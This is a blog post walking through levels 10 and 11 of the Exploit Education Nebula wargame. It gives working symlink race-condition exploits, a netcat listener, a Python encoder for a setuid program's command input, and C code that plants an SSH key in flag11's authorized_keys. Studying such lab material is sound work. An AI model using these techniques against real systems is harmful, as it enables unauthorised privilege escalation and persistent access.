---
layout: post
title: "Exploit Education - Nebula: Write-up (Part 1)"
date: 2019-06-25 21:44:38.000000000 +8:00
excerpt: Write-ups for all the nebula challenges included in the VM created by exploit education. Nebula covers a variety of simple and intermediate challenges that cover Linux privilege escalation, common scripting language issues, and file system race conditions.
tags: [exploit education, solution, nebula]
keywords: [exploit education, nebula, solution, tip, answer, ctf]
---

## Introduction

As the challenges are relatively short, I will be slowly updating this post will the ones I have completed. The VM can be obtained at [Exploit Education](https://exploit.education/nebula/), a website created by Andrew Griffiths that teaches common (and less than common) weaknesses and vulnerabilities in Linux.

The main purpose of each level is to bypass certain restrictions imposed by the system, and run `getflag` with the required privileges (pwn).

## Level10

Inspecting the home directory of `level10`, one may find a curious file names "x". Within the file, the password to the `flag10` account is stored. I assumed this was an unintended error as it would make this challenge boring. Thus, I ignored this file.

The home directory of `flag10` contains 2 files: a `token` file, which we do not have read permissions, and an executable with its source code provided online.

Inspecting the source code, the first thing I noticed was that the check by `access` is performed pre-maturely compared to the `open`. The timing difference is exaggerated by the `write` to a socket, which is known to take a long time. This increases the chance of a race condition, where we can abuse this delay to bypass the initial check. This is confirmed by the [man page for access](http://man7.org/linux/man-pages/man2/access.2.html), which specifies "...creates a security hole, because the user might exploit the short time interval between checking and opening the file to manipulate it."

In order to abuse the delay, we can swap the contents of the files we want to check. Initially, it may be a normal file, but it can be swapped to a symbolic link to the target file "token". This is done by the command `ln -fs /home/flag10/token foo.txt`. As the socket is created on port 18211, a keep-alive socket listener is required; it can be created by `netcat -kl 18211 &> out.txt &`. The last "&" indicates it runs in the background. To abuse the race condition, 2 terminals will be needed: one to repeatedly run the "flag10" executable by `while :; do /home/flag10/flag10 foo.txt 127.0.0.1; done`, and another to swap the original "foo.txt" to a symlink. We hope the timing is correct, and "out.txt" can be checked. If "out.txt" does not contain the required string, then the above process needs to be repeated.

Personally, I got the desired string - "615a2ce1-b2b5-4c76-8eed-8aa5c4015c27" - on my second try. 

## Level11

This level is rather interesting, as I suspect it is not performing as it is intended. Though I have devised a method that performs `getflag` successfully, it is rather convoluted compared to the most obvious method. That method does spawn a shell, but it has insufficient privileges.

The level provides the source code for a binary with the "setuid" bit on.

### Method 1

Inspecting the source code, it appears there is a `system` call within the `process` function. To trigger the `process` function, the first line of input must start with "Content-Length: xxxx", where "xxx" is a valid integer. Then, the integer is parsed, and an `if` function separates the program into 2 cases: one where the integer is smaller than 1024, and one where it is not. Interestingly, the case when the integer is smaller than 1024 only works when the integer is 1. This is indicated by the line `fread(buf, length, 1, stdin) != length`. `fread` returns the number of elements read. The size of each element is indicated by the second argument and the number of each element is limited by hte third argument. As the third argument is "1", the inequality will only hold true when the "length" is 1. With only 1 character under ur control, what I could have done is severely limited. Thus, I mainly focused on the second case.

The second case occurs when the inputted integer is larger or equal to 1024. In that case, a random file is generated by `getrand` and the program essentially reads "length" number of characters from the buffer. The characters are then processed by the `process` function and the message is executed by `system`.

Reversing the process/encryption is rather simple, as we can use the fact that (a ^ b) ^ b == a. As `k` changes after each character is processed, it is easy to reverse engineer it. After some math, the following python code was written to decrypt the code:

```python
def dc(b, l):
    a = ""
    k = l & 0xff
    for i in range(len(b)):
        a += chr((ord(b[i]) ^ k) & 0xff)
        k = (k - ord(b[i])) & 0xff
    return a
```

Thus, we can manipulate the information that goes into `system`. I intended to have an input of "getflag\00". The null terminator is required to finish the input. As a length of at least 1024 is required, the remaining bytes of the input can be padded by some junk character. This is summarised as follows:

```python
from __future__ import print_function
def p(*args):
    print(*args, end="")
cm = "getflag\x00"
print("Content-Length: %d" % (1024))
p(dc(cm, 1024))
for i in range(1024 - len(cm)):
    p("A")
```

Before executing, notice `getrand` requires and environmental variable "TEMP". This is often not set on the system, and I simply set it to "/tmp" by `export TEMP=/tmp`.

However, when it is executed, the program indicates we did not obtain the flag. Further inspection by `strace` reveals that the effective uid was reverted to the original just before the system call.

```bash
level11@nebula:~$ python py.py | /home/flag11/flag11
blue = 1024, length = 1024, pink = 1024
getflag is executing on a non-flag account, this doesn\'t count
level11@nebula:~$ python py.py | strace /home/flag11/flag11
...
getgid32()                              = 1012
setgid32(1012)                          = 0
getuid32()                              = 1012
setuid32(1012)                          = 0
...
```

I believe this is an unintended error, as this essentially blocks out all attacks that utilise `system`.

### Method 2

Fortunately, I have devised an alternative method. Observe the escalated permissions are only revoked just before the `system` call. Before that, another function that we can abuse is `write(fd, buf, pink)`. Through "fd" is determined by the random generator `getrand`, the file name that is generated can be estimated. It uses pid, which can be easily determined, and `time(NULL)`, whose resolution is only to hte nearest second. I can then create the predicted file beforehand, and symlink it to a file I want to overwrite (or create).

Now, I had to determine a target file to write. Looking around the home folder of "flag11", I found a ".ssh" folder. There are 2 ways to connect using SSH: using a password or using an authorised key. Coincidentally, the authorised keys are stored in the ".ssh" folder's "authorized_keys" files. Thus, if I can place the key of "level11" in the file, I can SSH into "flag11" without a password, and gain escalated privileges.

To generate a key for "level11", I used `ssh-keygen -t rsa` with default values. This creates a "id_rsa.pub" file, which contains the required keys. 

To predict the temporary filename, I use the fact that 2 executables that run consecutively have a pid difference of 1 and the first executable will execute in less than 1 second given the program is simple and the machine is fast. Using the above 2 facts, I created the following C file that pre-creates a file and symlinks it to "/home/flag11/.ssh/authorized_keys". Note that running this file will cause the executable to end pre-maturely as the required input length was not reached, but at this point the file contents have already been written so it does not matter. Replace `buffer` with whatever is in the "id_rsa.pub" file. In this case, encryption/processing is not needed as that is required for `system` only.

```C
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <fcntl.h>
#include <stdio.h>
#include <sys/mman.h>

int getrand(char **path, int pid, int time){
    int fd =  0;
    srandom(time);
    char *tmp = getenv("TEMP");
    asprintf(path, "%s/%d.%c%c%c%c%c%c", tmp, pid,
      'A' + (random() % 26), '0' + (random() % 10),
      'a' + (random() % 26), 'A' + (random() % 26),
      '0' + (random() % 10), 'a' + (random() % 26));
    return fd;
}

#define CL "Content-Length: "

int main(int argc, char **argv)
{
    char line[256];
    char buffer[10000] = "...";
    char *path;
    int pid = getpid()+1;
    getrand(&path, pid, time(NULL));
    symlink("/home/flag11/.ssh/authorized_keys",path);
    fprintf(stdout, "%s%d\n%s",CL,sizeof(buffer),buffer);
    return 0;
}
```

Using this method, I simply SSHed into flag11's account by `ssh flag11@127.0.0.1`, concluding this level.


